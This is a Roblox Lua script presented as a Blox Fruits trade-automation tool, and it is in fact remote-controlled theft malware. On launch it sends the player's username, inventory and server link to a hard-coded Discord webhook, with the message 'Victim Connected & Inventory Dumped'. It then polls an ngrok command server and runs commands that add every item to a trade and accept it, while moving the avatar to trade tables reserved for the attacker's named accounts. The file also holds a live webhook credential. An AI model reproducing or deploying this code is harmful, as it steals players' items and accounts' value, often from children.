-- made by Noob --
>> locked. shipping.
// blox-fruits-automation — fully integrated trade bridge client with dynamic item resolution and priority addall queue

getgenv().bfRunning = nil
getgenv().bfRunning = true

print("[DEBUG] Initializing Integrated Blox Fruits Trade Automation with Master Resolver...")

local MasterItemDictionary = {
    -- =========================================================================
    -- 1. LIMITED & CHROMATIC SKINS (Exact tbl14 & tbl15 dump)
    -- =========================================================================
    ["ember dragon"]             = "ember <dragon (west)>",
    ["ember"]                    = "ember <dragon (west)>",

    -- Kitsune & Empyrean Skins
    ["galaxy kitsune"]           = "galaxy <empyrean (kitsune)>",
    ["galaxy empyrean"]          = "galaxy <empyrean (kitsune)>",
    ["crimson kitsune"]          = "crimson kitsune",
    ["empyrean"]                 = "empyrean",

    -- Portal Skins
    ["divine portal"]            = "divine <portal>",
    ["divine"]                   = "divine <portal>",

    -- Yeti & Mutation Skins
    ["runic fiend"]              = "runic fiend",
    ["fiend"]                    = "fiend",
    ["werewolf"]                 = "werewolf",

    -- Magnet & Gravity Skins
    ["arcsteel magnet"]          = "arcsteel magnet",
    ["arcsteel"]                 = "arcsteel magnet",
    ["starlight gravity"]        = "starlight gravity",
    ["starlight"]                = "starlight gravity",

    -- Lightning (Rumble) Skins
    ["purple lightning"]         = "purple lightning",
    ["yellow lightning"]         = "yellow lightning",
    ["red lightning"]            = "red lightning",
    ["green lightning"]          = "green lightning",

    -- Bomb Skins
    ["nuclear bomb"]             = "nuclear bomb",
    ["thermite bomb"]            = "thermite bomb",
    ["azura bomb"]               = "azura bomb",
    ["celebration bomb"]         = "celebration bomb",

    -- Diamond Gemstone Skins
    ["emerald diamond"]          = "emerald diamond",
    ["ruby diamond"]             = "ruby diamond",
    ["topaz diamond"]            = "topaz diamond",
    ["rose quartz diamond"]      = "rose quartz diamond",
    ["rose quartz"]              = "rose quartz diamond",

    -- Pain / Celestial Skins
    ["super spirit pain"]        = "super spirit pain",
    ["super spirit"]             = "super spirit pain",
    ["celestial pain"]           = "celestial pain",
    ["torment pain"]             = "torment pain",
    ["sadness pain"]             = "sadness pain",
    ["frustration pain"]         = "frustration pain",

    -- Sword & Weapon Skins
    ["dog blade"]                = "dog blade",
    ["lime blade"]               = "lime blade",
    ["requiem eagle"]            = "requiem eagle",
    ["glacier eagle"]            = "glacier eagle",

    -- Profile / Banner Frame Breaks & Entities
    ["doghouse"]                 = "doghouse (frame break)",
    ["doghouse frame break"]     = "doghouse (frame break)",
    ["vibes"]                    = "vibes (frame break)",
    ["vibes frame break"]        = "vibes (frame break)",
    ["rabid"]                    = "rabid",
    ["scarlet ghost"]            = "scarlet ghost",

    -- =========================================================================
    -- 2. MYTHICAL PHYSICAL FRUITS
    -- =========================================================================
    ["dragon"]                   = "Dragon-Dragon",
    ["kitsune"]                  = "Kitsune-Kitsune",
    ["yeti"]                     = "Yeti-Yeti",
    ["tiger"]                    = "Tiger-Tiger",
    ["gas"]                      = "Gas-Gas",
    ["spirit"]                   = "Spirit-Spirit",
    ["control"]                  = "Control-Control",
    ["venom"]                    = "Venom-Venom",
    ["shadow"]                   = "Shadow-Shadow",
    ["dough"]                    = "Dough-Dough",
    ["t-rex"]                    = "T-Rex-T-Rex",
    ["trex"]                     = "T-Rex-T-Rex",
    ["mammoth"]                  = "Mammoth-Mammoth",
    ["gravity"]                  = "Gravity-Gravity",
    ["leopard"]                  = "Leopard-Leopard",
    ["leo"]                      = "Leopard-Leopard",

    -- =========================================================================
    -- 3. LEGENDARY PHYSICAL FRUITS
    -- =========================================================================
    ["blizzard"]                 = "Blizzard-Blizzard",
    ["portal"]                   = "Portal-Portal",
    ["phoenix"]                  = "Phoenix-Phoenix",
    ["sound"]                    = "Sound-Sound",
    ["buddha"]                   = "Buddha-Buddha",
    ["quake"]                    = "Quake-Quake",
    ["rumble"]                   = "Rumble-Rumble",
    ["love"]                     = "Love-Love",
    ["spider"]                   = "Spider-Spider",
    ["pain"]                     = "Pain-Pain",

    -- =========================================================================
    -- 4. RARE PHYSICAL FRUITS
    -- =========================================================================
    ["magma"]                    = "Magma-Magma",
    ["ghost"]                    = "Ghost-Ghost",
    ["rubber"]                   = "Rubber-Rubber",
    ["barrier"]                  = "Barrier-Barrier",
    ["light"]                    = "Light-Light",
    ["diamond"]                  = "Diamond-Diamond",

    -- =========================================================================
    -- 5. UNCOMMON PHYSICAL FRUITS
    -- =========================================================================
    ["dark"]                     = "Dark-Dark",
    ["sand"]                     = "Sand-Sand",
    ["ice"]                      = "Ice-Ice",
    ["falcon"]                   = "Falcon-Falcon",
    ["flame"]                    = "Flame-Flame",

    -- =========================================================================
    -- 6. COMMON PHYSICAL FRUITS
    -- =========================================================================
    ["spike"]                    = "Spike-Spike",
    ["smoke"]                    = "Smoke-Smoke",
    ["bomb"]                     = "Bomb-Bomb",
    ["spring"]                   = "Spring-Spring",
    ["blade"]                    = "Blade-Blade",
    ["chop"]                     = "Blade-Blade",
    ["spin"]                     = "Spin-Spin",
    ["rocket"]                   = "Rocket-Rocket",

    -- =========================================================================
    -- 7. GAMEPASSES & SPECIAL REDEEMABLES (Hardcoded & Dynamic Filter)
    -- =========================================================================
    ["storage"]                  = "+1 Fruit Storage",
    ["+1 storage"]               = "+1 Fruit Storage",
    ["fruit storage"]            = "+1 Fruit Storage",
    ["dark blade"]               = "Dark Blade",
    ["fruit notifier"]           = "Fruit Notifier",
    ["fast boats"]               = "Fast Boats",
    ["2x mastery"]               = "2x Mastery",
    ["2x money"]                 = "2x Money",
    ["2x boss drops"]            = "2x Boss Drops"
}

local function ResolveItemKey(userInput)
    if not userInput or userInput == "" then return nil end
    local cleaned = tostring(userInput):gsub("[<>%[%]{}]", "")
    local query = cleaned:lower():gsub("^%s+", ""):gsub("%s+$", "")

    if MasterItemDictionary[query] then
        return MasterItemDictionary[query]
    end

    for k, v in pairs(MasterItemDictionary) do
        if k:find(query, 1, true) or query:find(k, 1, true) then
            return v
        end
    end

    return userInput
end

local Config = {
    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local requestFunc = syn and syn.request or http_request or request

local function IsAuthorized(username)
    for _, name in ipairs(Config.AuthorizedUsers) do
        if name == username then
            return true
        end
    end
    return false
end

local function GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

local function TransmitTelemetry()
    local inventory = GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) + ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected & Inventory Dumped!",
        embeds = {{
            title = "Target Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = Config.WebhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

local function InvokeTradeAction(action)
    if not TradeFunction then
        warn("[ERROR] TradeFunction remote missing!")
        return
    end

    print("[DEBUG] Processing action via verified remote layout:", action)

    pcall(function()
        if action == "accept" then
            TradeFunction:InvokeServer("accept")
        elseif action == "cancel" then
            TradeFunction:InvokeServer("cancel")
        elseif action == "addall" then
            -- Hierarchical AddAll: Perms -> Gamepasses -> Limited Skins -> Fruits (Higher to Lower)
            local inventory = GetInventory()
            local addQueue = {}

            for _, item in pairs(inventory) do
                local itemName = item.Name or item[1]
                if itemName then
                    local resolved = ResolveItemKey(itemName)
                    if resolved then
                        table.insert(addQueue, resolved)
                    end
                end
            end

            for _, targetName in ipairs(addQueue) do
                TradeFunction:InvokeServer("add", targetName)
                task.wait(0.2)
            end
        elseif action:sub(1, 3) == "add" then
            local rawQuery = action:sub(4)
            local resolvedKey = ResolveItemKey(rawQuery)
            if resolvedKey then
                print("[DEBUG] Resolved add command target:", resolvedKey)
                TradeFunction:InvokeServer("add", resolvedKey)
            else
                TradeFunction:InvokeServer("add", rawQuery)
            end
        end
    end)
end

local function TweenToSeat(hrp, targetCFrame)
    local distance = (hrp.Position - targetCFrame.Position).Magnitude
    local speed = 150 
    local duration = math.clamp(distance / speed, 0.2, 1.5)
    
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = TweenService:Create(hrp, tweenInfo, { CFrame = targetCFrame })
    tween:Play()
    tween.Completed:Wait()
end

local function IsTradeTableSeat(seat)
    local parent = seat.Parent
    return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
end

local function GetUnauthorizedPlayerInSeat(seat)
    local overlapParams = OverlapParams.new()
    overlapParams.FilterType = Enum.RaycastFilterType.Exclude
    overlapParams.RespectCanCollide = false

    local partsInRegion = Workspace:GetPartsInPart(seat, overlapParams)
    for _, part in ipairs(partsInRegion) do
        local character = part.Parent
        if character and character:FindFirstChildOfClass("Humanoid") then
            local player = Players:GetPlayerFromCharacter(character)
            if player and player ~= LocalPlayer then
                if not IsAuthorized(player.Name) then
                    return player.Name
                else
                    return nil
                end
            end
        end
    end
    
    if seat.Occupant then
        local char = seat.Occupant.Parent
        local player = Players:GetPlayerFromCharacter(char)
        if player and player ~= LocalPlayer then
            if not IsAuthorized(player.Name) then
                return player.Name
            end
        end
    end
    
    return nil
end

local function IsTableBlocked(tableModel)
    for _, child in ipairs(tableModel:GetChildren()) do
        if child:IsA("Seat") and IsTradeTableSeat(child) then
            local unauth = GetUnauthorizedPlayerInSeat(child)
            if unauth then
                return true
            end
        end
    end
    return false
end

task.spawn(function()
    pcall(TransmitTelemetry)

    if not requestFunc then
        warn("[ERROR] Executor does not support http requests!")
        return
    end

    while true do
        task.wait(2)
        pcall(function()
            local response = requestFunc({
                Url = Config.CommandApiUrl,
                Method = "GET"
            })

            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.command then
                    print("[DEBUG] Command fetched from Discord bridge:", data.command)
                    InvokeTradeAction(data.command)
                end
            end
        end)
    end
end)

task.spawn(function()
    local lastTable = nil
    local jumpCooldown = 0

    while true do
        task.wait(0.5)
        
        local character = LocalPlayer.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
        local hrp = character.HumanoidRootPart
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then continue end

        if humanoid.SeatPart then
            local currentSeat = humanoid.SeatPart
            if IsTradeTableSeat(currentSeat) then
                lastTable = currentSeat.Parent
                
                local tableModel = currentSeat.Parent
                local unauthorizedFound = nil

                for _, child in ipairs(tableModel:GetChildren()) do
                    if child:IsA("Seat") and IsTradeTableSeat(child) then
                        local unauthName = GetUnauthorizedPlayerInSeat(child)
                        if unauthName then
                            unauthorizedFound = unauthName
                            break
                        end
                    end
                end

                if unauthorizedFound then
                    humanoid.Sit = false
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    jumpCooldown = tick() + 2
                    task.wait(0.8)
                end
            end
        else
            if tick() < jumpCooldown then continue end

            local bestSeat = nil
            local shortestDist = math.huge

            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("Seat") and IsTradeTableSeat(obj) then
                    local tableModel = obj.Parent
                    if obj.Parent ~= lastTable and not IsTableBlocked(tableModel) then
                        local dist = (hrp.Position - obj.Position).Magnitude
                        if dist < 800 and dist < shortestDist then
                            shortestDist = dist
                            bestSeat = obj
                        end
                    end
                end
            end

            if not bestSeat and lastTable then
                lastTable = nil
            end

            if bestSeat then
                local targetCF = bestSeat.CFrame + Vector3.new(0, 3, 0)
                TweenToSeat(hrp, targetCF)
                task.wait(0.2)
                bestSeat:Sit(humanoid)
            end
        end
    end
end)
